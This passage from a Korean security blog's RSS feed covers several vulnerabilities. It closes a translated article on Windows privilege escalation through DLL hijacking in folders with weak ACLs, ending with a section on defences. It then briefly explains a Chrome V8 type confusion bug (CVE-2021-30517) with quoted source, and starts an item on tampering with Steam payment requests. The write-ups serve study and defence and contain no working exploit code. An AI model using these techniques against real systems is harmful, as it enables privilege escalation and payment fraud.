&#xC218; &#xC788;&#xB2E4;. &#xC751;&#xC6A9; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; <code>ProgramData</code> &#xD558;&#xC704; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC5D0; &#xB530;&#xB77C; &#xD558;&#xC704; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC5D0; &#xB300;&#xD55C; ACL&#xC774; &#xBA85;&#xC2DC;&#xC801;&#xC73C;&#xB85C; &#xC124;&#xC815;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xACBD;&#xC6B0; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC774; &#xAC00;&#xB2A5;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><p>&#xB2E4;&#xC74C;&#xC740; <code>C:\ProgramData\</code> &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB418;&#xBA70; &#xC608;&#xC57D;&#xB41C; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xAD6C;&#xC131; &#xC694;&#xC18C;&#xAC00; &#xC788;&#xB294; &#xC751;&#xC6A9; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774;&#xB2E4;.</p><p><img src="/2021/08/18/l0ch/procmon-lpe/Untitled%2011.png" alt="Untitled"></p><p>&#xC774;&#xAC83;&#xC740; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC758; &#xB290;&#xC2A8;&#xD55C; ACL&#xB85C; &#xC778;&#xD574; &#xAC00;&#xB2A5;&#xD55C; DLL hijacking&#xC758; &#xC9C1;&#xC811;&#xC801;&#xC778; &#xC0AC;&#xB840;&#xC774;&#xB2E4;. </p><p><img src="/2021/08/18/l0ch/procmon-lpe/Untitled%2012.png" alt="Untitled"></p><p>&#xC774;&#xC81C; &#xC9C1;&#xC811; &#xC81C;&#xC791;&#xD55C; <code>calc.exe</code>&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294; <code>msi.dll</code>&#xC744; &#xBC30;&#xCE58;&#xD558;&#xBA74; &#xC131;&#xACF5;&#xC801;&#xC73C;&#xB85C; SYSTEM &#xAD8C;&#xD55C;&#xC758; <code>calc.exe</code> &#xAC00; &#xC2E4;&#xD589;&#xB41C;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; &#xBB38;&#xC81C;&#xB294; &#xB9CC;&#xC5F0;&#xD558;&#xBA70; &#xC545;&#xC6A9;&#xD558;&#xAE30;&#xAC00; &#xC27D;&#xB2E4;.</p><p>DLL hijacking&#xC774; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC744; &#xC704;&#xD55C; &#xC720;&#xC77C;&#xD55C; &#xC635;&#xC158;&#xC774; &#xC544;&#xB2C8;&#xB77C;&#xB294; &#xC810;&#xC740; &#xC8FC;&#xBAA9;&#xD560; &#xB9CC; &#xD558;&#xB2E4;. &#xAD8C;&#xD55C; &#xC788;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xBAA8;&#xB4E0; &#xC0AC;&#xC6A9;&#xC790; &#xC4F0;&#xAE30; &#xAC00;&#xB2A5; &#xD30C;&#xC77C;&#xC740; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xCDE8;&#xC57D;&#xD560; &#xAC00;&#xB2A5;&#xC131;&#xC774; &#xC788;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4;, &#xB2E4;&#xC74C;&#xC740; &#xAD8C;&#xD55C; &#xC788;&#xB294; &#xC790;&#xB3D9; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xBA54;&#xCEE4;&#xB2C8;&#xC998;&#xC744; &#xC9C0;&#xC2DC;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xB294; &#xD14D;&#xC2A4;&#xD2B8; &#xD30C;&#xC77C;&#xC744; &#xD655;&#xC778;&#xD558;&#xB294; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774;&#xB2E4;. &#xC544;&#xB798;&#xC5D0;&#xC11C; &#xBCFC; &#xC218; &#xC788;&#xB4EF;&#xC774; &#xC870;&#xC791;&#xB41C; &#xD14D;&#xC2A4;&#xD2B8; &#xD30C;&#xC77C;&#xC774; &#xC788;&#xC73C;&#xBA74; &#xC784;&#xC758;&#xC758; &#xBA85;&#xB839;&#xC774; &#xC2E4;&#xD589;&#xB420; &#xC218; &#xC788;&#xACE0; &#xC0AC;&#xC9C4;&#xC758; &#xACBD;&#xC6B0; <code>calc.exe</code>&#xB97C; &#xC2DC;&#xC791;&#xD55C;&#xB2E4;.</p><p><img src="/2021/08/18/l0ch/procmon-lpe/Untitled%2013.png" alt="Untitled"></p><h3 id="&#xC2DC;&#xC2A4;&#xD15C;-&#xB8E8;&#xD2B8;&#xC758;-&#xD558;&#xC704;-&#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC5D0;-&#xC124;&#xCE58;"><a href="#&#xC2DC;&#xC2A4;&#xD15C;-&#xB8E8;&#xD2B8;&#xC758;-&#xD558;&#xC704;-&#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC5D0;-&#xC124;&#xCE58;" class="headerlink" title="&#xC2DC;&#xC2A4;&#xD15C; &#xB8E8;&#xD2B8;&#xC758; &#xD558;&#xC704; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC5D0; &#xC124;&#xCE58;"></a>&#xC2DC;&#xC2A4;&#xD15C; &#xB8E8;&#xD2B8;&#xC758; &#xD558;&#xC704; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC5D0; &#xC124;&#xCE58;</h3><p>&#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xC751;&#xC6A9; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xC2DC;&#xC2A4;&#xD15C; &#xB8E8;&#xD2B8;&#xC758; &#xB2E4;&#xB978; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC5D0; &#xBC30;&#xCE58;&#xD558;&#xB294; &#xC124;&#xCE58; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC740; &#xBCF4;&#xC548;&#xC744; &#xC720;&#xC9C0;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC801;&#xC808;&#xD55C; ACL&#xC744; &#xC124;&#xC815;&#xD574;&#xC57C; &#xD55C;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4; Python 2.7&#xC740; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; <code>C:\python27\</code>&#xC5D0; &#xC124;&#xCE58;&#xB41C;&#xB2E4;.</p><p><img src="/2021/08/18/l0ch/procmon-lpe/Untitled%2014.png" alt="Untitled"></p><p>&#xC774; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC758; &#xAE30;&#xBCF8; ACL&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC774; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC758; &#xB0B4;&#xC6A9;&#xC744; &#xC218;&#xC815;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xC774;&#xC81C; &#xC774;&#xAC83;&#xC73C;&#xB85C; DLL hijacking &#xAE30;&#xC220;&#xC744; &#xC2DC;&#xB3C4;&#xD574; &#xBCFC; &#xC218; &#xC788;&#xB2E4;.</p><p><img src="/2021/08/18/l0ch/procmon-lpe/Untitled%2015.png" alt="Untitled"></p><p>&#xC774;&#xB294; &#xC5B4;&#xB835;&#xAC8C; &#xC0DD;&#xAC01;&#xD560; &#xD544;&#xC694;&#xB3C4; &#xC5C6;&#xB2E4;. &#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xB85C; <code>C:\python27\</code> &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC758; &#xBAA8;&#xB4E0; &#xD30C;&#xC77C;&#xC744; &#xAC04;&#xB2E8;&#xD788; &#xBC14;&#xAFC0; &#xC218; &#xC788;&#xB2E4;.</p><p><img src="/2021/08/18/l0ch/procmon-lpe/Untitled%2016.png" alt="Untitled"></p><h3 id="ACL-&#xC124;&#xC815;-&#xC5C6;&#xC774;-&#xC0AC;&#xC6A9;&#xC790;-&#xC9C0;&#xC815;-&#xC124;&#xCE58;-&#xB514;&#xB809;&#xD1A0;&#xB9AC;-&#xD5C8;&#xC6A9;"><a href="#ACL-&#xC124;&#xC815;-&#xC5C6;&#xC774;-&#xC0AC;&#xC6A9;&#xC790;-&#xC9C0;&#xC815;-&#xC124;&#xCE58;-&#xB514;&#xB809;&#xD1A0;&#xB9AC;-&#xD5C8;&#xC6A9;" class="headerlink" title="ACL &#xC124;&#xC815; &#xC5C6;&#xC774; &#xC0AC;&#xC6A9;&#xC790; &#xC9C0;&#xC815; &#xC124;&#xCE58; &#xB514;&#xB809;&#xD1A0;&#xB9AC; &#xD5C8;&#xC6A9;"></a>ACL &#xC124;&#xC815; &#xC5C6;&#xC774; &#xC0AC;&#xC6A9;&#xC790; &#xC9C0;&#xC815; &#xC124;&#xCE58; &#xB514;&#xB809;&#xD1A0;&#xB9AC; &#xD5C8;&#xC6A9;</h3><p>&#xB9CE;&#xC740; &#xC124;&#xCE58; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC740; <code>C:\Program Files\</code>&#xC758; &#xAE30;&#xBCF8;&#xC801;&#xC778; &#xBCF4;&#xC548; ACL &#xC0C1;&#xC18D;&#xC73C;&#xB85C; &#xC778;&#xD574; &#xC548;&#xC804;&#xD558;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC790;&#xC2E0;&#xC758; &#xC124;&#xCE58; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xB97C; &#xC120;&#xD0DD;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xD558;&#xB294; &#xC124;&#xCE58; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC740; &#xB300;&#xC0C1; &#xC704;&#xCE58;&#xC5D0; ACL&#xC744; &#xBA85;&#xC2DC;&#xC801;&#xC73C;&#xB85C; &#xC124;&#xC815;&#xD574;&#xC57C; &#xD55C;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; &#xD14C;&#xC2A4;&#xD2B8;&#xC5D0;&#xC11C; &#xC124;&#xCE58; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; ACL&#xC744; &#xBA85;&#xC2DC;&#xC801;&#xC73C;&#xB85C; &#xC124;&#xC815;&#xD558;&#xB294; &#xACBD;&#xC6B0;&#xB294; &#xB9E4;&#xC6B0; &#xB4DC;&#xBB3C;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xBC1C;&#xACAC;&#xD588;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4; Microsoft SQL Server 2019 &#xC124;&#xCE58; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xC0B4;&#xD3B4;&#xBCF4;&#xB3C4;&#xB85D; &#xD55C;&#xB2E4;.</p><p><img src="/2021/08/18/l0ch/procmon-lpe/Untitled%2017.png" alt="Untitled"></p><blockquote><p>&#x201C;&#xACE0;&#xAE09;&#x201D; &#xB610;&#xB294; &#x201C;&#xC0AC;&#xC6A9;&#xC790; &#xC9C0;&#xC815;&#x201D; &#xC124;&#xCE58;&#xB97C; &#xC218;&#xD589;&#xD560; &#xD544;&#xC694;&#xB3C4; &#xC5C6;&#xC774; &#xC124;&#xCE58; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC6D0;&#xD558;&#xB294; &#xACBD;&#xB85C;&#xB97C; &#xC124;&#xC815;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p></blockquote><p>&#xC124;&#xCE58; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; ACL&#xC744; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xB97C; &#xC124;&#xCE58;&#xD558;&#xB294; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xB85C; &#xC124;&#xC815;&#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD55C;&#xB2E4;.</p><p><img src="/2021/08/18/l0ch/procmon-lpe/Untitled%2018.png" alt="Untitled"></p><blockquote><p>SQL Express 2019&#xAC00; &#xC124;&#xCE58;&#xB41C; &#xC704;&#xCE58;&#xB97C; &#xC218;&#xC815;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p></blockquote><p><img src="/2021/08/18/l0ch/procmon-lpe/Untitled%2019.png" alt="Untitled"></p><p>Microsoft SQL Server 2019&#xC640; &#xAC19;&#xC774; &#xC124;&#xCE58;&#xD560; &#xC704;&#xCE58;&#xB97C; &#xC120;&#xD0DD;&#xD560; &#xC218; &#xC788;&#xB294; &#xAC70;&#xC758; &#xBAA8;&#xB4E0; Windows &#xC751;&#xC6A9; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC740; &#xB2E8;&#xC21C;&#xD788; &#xC124;&#xCE58;&#xB41C; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC5D0; &#xB530;&#xB77C; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC5D0; &#xCDE8;&#xC57D;&#xD560; &#xC218; &#xC788;&#xC74C;&#xC744; &#xBCF4;&#xC5EC;&#xC900;&#xB2E4;.</p><h1 id="&#xAD8C;&#xD55C;-&#xC0C1;&#xC2B9;-&#xCDE8;&#xC57D;&#xC810;-&#xBC29;&#xC5B4;"><a href="#&#xAD8C;&#xD55C;-&#xC0C1;&#xC2B9;-&#xCDE8;&#xC57D;&#xC810;-&#xBC29;&#xC5B4;" class="headerlink" title="&#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC810; &#xBC29;&#xC5B4;"></a>&#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC810; &#xBC29;&#xC5B4;</h1><h2 id="&#xAD8C;&#xD55C;-&#xC5C6;&#xB294;-&#xC0AC;&#xC6A9;&#xC790;&#xC758;-&#xC2DC;&#xC2A4;&#xD15C;-&#xB8E8;&#xD2B8;&#xC5D0;&#xC11C;-&#x201C;&#xD3F4;&#xB354;-&#xB9CC;&#xB4E4;&#xAE30;&#x201D;-&#xAD8C;&#xD55C;-&#xC81C;&#xAC70;"><a href="#&#xAD8C;&#xD55C;-&#xC5C6;&#xB294;-&#xC0AC;&#xC6A9;&#xC790;&#xC758;-&#xC2DC;&#xC2A4;&#xD15C;-&#xB8E8;&#xD2B8;&#xC5D0;&#xC11C;-&#x201C;&#xD3F4;&#xB354;-&#xB9CC;&#xB4E4;&#xAE30;&#x201D;-&#xAD8C;&#xD55C;-&#xC81C;&#xAC70;" class="headerlink" title="&#xAD8C;&#xD55C; &#xC5C6;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xC2DC;&#xC2A4;&#xD15C; &#xB8E8;&#xD2B8;&#xC5D0;&#xC11C; &#x201C;&#xD3F4;&#xB354; &#xB9CC;&#xB4E4;&#xAE30;&#x201D; &#xAD8C;&#xD55C; &#xC81C;&#xAC70;"></a>&#xAD8C;&#xD55C; &#xC5C6;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xC2DC;&#xC2A4;&#xD15C; &#xB8E8;&#xD2B8;&#xC5D0;&#xC11C; &#x201C;&#xD3F4;&#xB354; &#xB9CC;&#xB4E4;&#xAE30;&#x201D; &#xAD8C;&#xD55C; &#xC81C;&#xAC70;</h2><p>&#xC704;&#xC5D0; &#xC124;&#xBA85;&#xB41C; &#xACF5;&#xACA9;&#xC5D0; &#xB300;&#xD55C; &#xAC00;&#xC7A5; &#xAC04;&#xB2E8;&#xD55C; &#xBC29;&#xC5B4;&#xB294; &#xC2DC;&#xC2A4;&#xD15C; &#xB8E8;&#xD2B8; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC5D0;&#xC11C; &#xD3F4;&#xB354;&#xB97C; &#xB9CC;&#xB4E4; &#xC218; &#xC788;&#xB294; &#xAD8C;&#xD55C;&#xC744; &#xC81C;&#xAC70;&#xD558;&#xB294; &#xAC83;&#xC774;&#xB2E4;.</p><p><img src="/2021/08/18/l0ch/procmon-lpe/Untitled%2020.png" alt="Untitled"></p><h2 id="C-Program-Files-&#xC678;&#xBD80;&#xC5D0;-&#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;-&#xC124;&#xCE58;&#xD558;&#xC9C0;-&#xC54A;&#xAE30;"><a href="#C-Program-Files-&#xC678;&#xBD80;&#xC5D0;-&#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;-&#xC124;&#xCE58;&#xD558;&#xC9C0;-&#xC54A;&#xAE30;" class="headerlink" title="C:\Program Files\ &#xC678;&#xBD80;&#xC5D0; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xC124;&#xCE58;&#xD558;&#xC9C0; &#xC54A;&#xAE30;"></a>C:\Program Files\ &#xC678;&#xBD80;&#xC5D0; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xC124;&#xCE58;&#xD558;&#xC9C0; &#xC54A;&#xAE30;</h2><p>&#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xAC00; <code>C:\Program Files\</code> &#xB610;&#xB294; <code>C:\Program Files (x86)\</code> &#xC774;&#xC678;&#xC758; &#xC704;&#xCE58;&#xC5D0; &#xC124;&#xCE58;&#xB41C; &#xACBD;&#xC6B0;  ACL&#xC744; &#xBA85;&#xC2DC;&#xC801;&#xC73C;&#xB85C; &#xC124;&#xC815;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC548;&#xC804;&#xD558;&#xB2E4;. &#xAD8C;&#xC7A5;&#xB418;&#xB294; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xC704;&#xCE58;&#xC5D0;&#xB9CC; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xB97C; &#xC124;&#xCE58;&#xD558;&#xBA74; &#xC704;&#xC640; &#xAC19;&#xC740; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD53C;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><h2 id="&#xC2DC;&#xC2A4;&#xD15C;-&#xD14C;&#xC2A4;&#xD2B8;-&#xBC0F;-&#xAC15;&#xD654;"><a href="#&#xC2DC;&#xC2A4;&#xD15C;-&#xD14C;&#xC2A4;&#xD2B8;-&#xBC0F;-&#xAC15;&#xD654;" class="headerlink" title="&#xC2DC;&#xC2A4;&#xD15C; &#xD14C;&#xC2A4;&#xD2B8; &#xBC0F; &#xAC15;&#xD654;"></a>&#xC2DC;&#xC2A4;&#xD15C; &#xD14C;&#xC2A4;&#xD2B8; &#xBC0F; &#xAC15;&#xD654;</h2><p>&#xC704;&#xC5D0;&#xC11C; &#xC124;&#xBA85;&#xD55C; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xBAA8;&#xB2C8;&#xD130; &#xD544;&#xD130; &#xBC0F; &#xAE30;&#xC220;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC131;&#xC5D0; &#xB300;&#xD574; &#xC790;&#xCCB4; &#xD50C;&#xB7AB;&#xD3FC;&#xC744; &#xD14C;&#xC2A4;&#xD2B8;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xC548;&#xC804;&#xD558;&#xC9C0; &#xC54A;&#xC740; &#xAC83;&#xC73C;&#xB85C; &#xD655;&#xC778;&#xB41C; &#xD30C;&#xC77C; &#xC704;&#xCE58;&#xC758; &#xACBD;&#xC6B0; &#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xD574;&#xB2F9; &#xC704;&#xCE58;&#xB97C; &#xC218;&#xC815;&#xD560; &#xC218; &#xC5C6;&#xB3C4;&#xB85D; &#xD574;&#xB2F9; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xB97C; &#xC218;&#xB3D9;&#xC73C;&#xB85C; &#xC7A0;&#xAE00; &#xC218; &#xC788;&#xC73C;&#xBA70; &#xBC1C;&#xACAC;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xACBD;&#xC6B0; &#xD574;&#xB2F9; &#xACF5;&#xAE09;&#xC5C5;&#xCCB4;&#xC5D0; &#xC5F0;&#xB77D;&#xD574; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC54C;&#xB9AC;&#xB294; &#xAC83;&#xC774; &#xC88B;&#xB2E4;. &#xACF5;&#xAE09;&#xC5C5;&#xCCB4;&#xC640;&#xC758; &#xCEE4;&#xBBA4;&#xB2C8;&#xCF00;&#xC774;&#xC158;&#xC758; &#xACBD;&#xC6B0; CERT/CC&#xAC00; &#xC9C0;&#xC6D0;&#xC744; &#xC81C;&#xACF5; &#xD560; &#xC218; &#xC788;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Translation/">Translation</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/lpe/">lpe</category>
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/vulnerability/">vulnerability</category>
      
      <category domain="https://hackyboiz.github.io/tags/translation/">translation</category>
      
      
      <comments>https://hackyboiz.github.io/2021/08/18/l0ch/procmon-lpe/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-30517: Chrome V8 엔진의 Type Confusion 취약점</title>
      <link>https://hackyboiz.github.io/2021/08/17/l0ch/2021-08-17/</link>
      <guid>https://hackyboiz.github.io/2021/08/17/l0ch/2021-08-17/</guid>
      <pubDate>Tue, 17 Aug 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://bugs.chromium.org/p/chromium/issues/detail?id=120</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1203122">Issue 1203122: Security: Type confusion bug in LoadSuperIC</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Chrome V8</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Chrome V8&#xC5D4;&#xC9C4;&#xC758; <a href="https://mathiasbynens.be/notes/shapes-ics">&#xC778;&#xB77C;&#xC778; &#xCE90;&#xC2DC;(IC)</a> &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C; type confusion &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; <code>AccessorAssembler::LoadSuperIC</code>&#xC640; <code>AccessorAssembler::HandleLoadICHandlerCase</code> &#xC5D0; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">AccessorAssembler::LoadSuperIC</span><span class="hljs-params">(<span class="hljs-keyword">const</span> LoadICParameters* p)</span> </span>{...BIND(&amp;non_inlined);  {    <span class="hljs-comment">// LoadIC_Noninlined can be used here, since it handles the</span>    <span class="hljs-comment">// lookup_start_object != receiver case gracefully.</span>    LoadIC_Noninlined(p, lookup_start_object_map, strong_feedback, &amp;var_handler,                      &amp;if_handler, &amp;miss, &amp;direct_exit);  }...}</code></pre><p><code>LoadSuperIC</code> &#xBA54;&#xC18C;&#xB4DC;&#xC5D0;&#xC11C; <code>LoadIC_Noninlined</code>&#xB294; <code>lookup_start_object != receiver</code> &#xC758; &#xACBD;&#xC6B0;&#xB97C; &#xCC98;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">AccessorAssembler::HandleLoadICHandlerCase</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">...</span></span><span class="hljs-function"><span class="hljs-params">  BIND(&amp;call_handler); &lt;------- [<span class="hljs-number">6</span>]</span></span><span class="hljs-function"><span class="hljs-params">  {</span></span><span class="hljs-function"><span class="hljs-params">    exit_point-&gt;ReturnCallStub(LoadWithVectorDescriptor{}, CAST(handler),</span></span><span class="hljs-function"><span class="hljs-params">                               p-&gt;context(), p-&gt;receiver(), p-&gt;name(),</span></span><span class="hljs-function"><span class="hljs-params">                               p-&gt;slot(), p-&gt;<span class="hljs-built_in">vector</span>());</span></span><span class="hljs-function"><span class="hljs-params">  }</span></span><span class="hljs-function"><span class="hljs-params">}</span></span></code></pre><p>&#xADF8;&#xB7EC;&#xB098; <code>HandleLoadICHandlerCase</code> &#xBA54;&#xC18C;&#xB4DC;&#xC5D0;&#xC11C; <code>lookup_start_object != receiver</code>&#xC778;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xC9C0; &#xC54A;&#xACE0; <code>p&#x2192;lookup_start_object()</code> &#xB300;&#xC2E0; <code>p&#x2192;receiver()</code>&#xB97C; &#xC804;&#xB2EC;&#xD574; &#xD578;&#xB4E4;&#xB7EC;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xACE0; type confusion&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xD574;&#xCEE4;&#xAC00; Object&#xB97C; StringWrapper&#xB85C; type confusion&#xD574; &#xAC1D;&#xCCB4;&#xC758; &#xC694;&#xC18C; &#xC8FC;&#xC18C;&#xB97C; leak&#xD558;&#xAC70;&#xB098; &#xBC30;&#xC5F4;&#xC744; &#xD568;&#xC218;&#xB85C; &#xC0DD;&#xAC01;&#xD558;&#xAC8C;&#xB054; &#xAC1D;&#xCCB4;&#xB97C; &#xC18D;&#xC5EC; arbitrary read/write primitive&#xB97C; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/chrome/">chrome</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/v8/">v8</category>
      
      <category domain="https://hackyboiz.github.io/tags/type-confusion/">type confusion</category>
      
      
      <comments>https://hackyboiz.github.io/2021/08/17/l0ch/2021-08-17/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] Smart2Pay in-flight 데이터 수정으로 Steam 잔액 충전</title>
      <link>https://hackyboiz.github.io/2021/08/16/fabu1ous/2021-08-16/</link>
      <guid>https://hackyboiz.github.io/2021/08/16/fabu1ous/2021-08-16/</guid>
      <pubDate>Mon, 16 Aug 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://hackerone.com/reports/1295844&quot;&gt;Modify in-flight d</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://hackerone.com/reports/1295844">Modify in-flight data to payment provider Smart2Pay</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Smart2Pay</p><p>Steam</p><p>Valve</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>&#xAC8C;&#xC784; &#xC720;&#xD1B5; &#xD50C;&#xB7AB;&#xD3FC; Steam&#xC758; Smart2Pay&#xB97C; &#xC774;&#xC6A9;&#xD55C; &#xACB0;&#xC81C; &#xBC29;&#xC2DD;&#xC5D0;&#xC11C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. Smart2Pay&#xB97C; &#xD1B5;&#xD574; Steam &#xC794;&#xC561; &#xCDA9;&#xC804; &#xC2DC; <code>https://globalapi.smart2pay.com/</code>&#xB85C; &#xBCF4;&#xB0B4;&#xC9C0;&#xB294; POST &#xB9AC;&#xD018;&#xC2A4;&#xD2B8;&#xB97C; &#xC870;&#xC791;&#xD574; 